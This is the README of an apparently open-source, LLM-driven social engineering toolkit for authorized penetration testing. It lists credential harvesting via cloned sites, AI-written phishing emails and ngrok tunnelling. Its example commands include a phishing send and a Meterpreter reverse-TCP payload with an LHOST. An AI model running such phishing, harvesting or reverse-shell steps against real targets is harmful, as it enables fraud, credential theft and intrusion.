# AutoSET - AI-Powered Social Engineering Toolkit

Fully automated social engineering framework powered by local AI and cloud LLMs.

## Features

- **Credential Harvester**: Clone websites and capture credentials
- **Phishing Campaigns**: AI-generated convincing emails
- **Payload Generation**: Automated msfvenom wrapper
- **Public Tunneling**: Ngrok integration for external access
- **Multi-LLM Support**: Groq, Cohere, DeepSeek, Ollama

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Configure API keys
cp autoset/config/*.json.example autoset/config/*.json
# Edit the .json files with your keys

# Run AutoSET
python autoset/agent.py

# Example commands
/harvest https://example.com
/phish target@company.com "password reset required"
/payload windows/meterpreter/reverse_tcp LHOST=10.0.0.1
```

## Architecture

```
autoset/
├── agent.py              # Main entry point
├── core/
│   ├── llm_provider.py   # Multi-LLM abstraction
│   ├── planner.py        # SE-specific planning
│   └── prompts.py        # System prompts
├── tools/
│   ├── harvester.py      # Credential capture server
│   ├── web_clone.py      # Website cloning
│   ├── smtp.py           # Email sending
│   ├── payload_gen.py    # Payload generation
│   └── tunnel.py         # Ngrok tunneling
└── utils/
    ├── workspace.py      # Isolated environments
    └── logging_setup.py  # Logging
```

## Legal Notice

⚠️ **FOR AUTHORIZED TESTING ONLY**

This tool is for authorized penetration testing and security research only.
Unauthorized use is illegal. Always obtain written permission before testing.

## License

MIT License - Use responsibly and ethically.
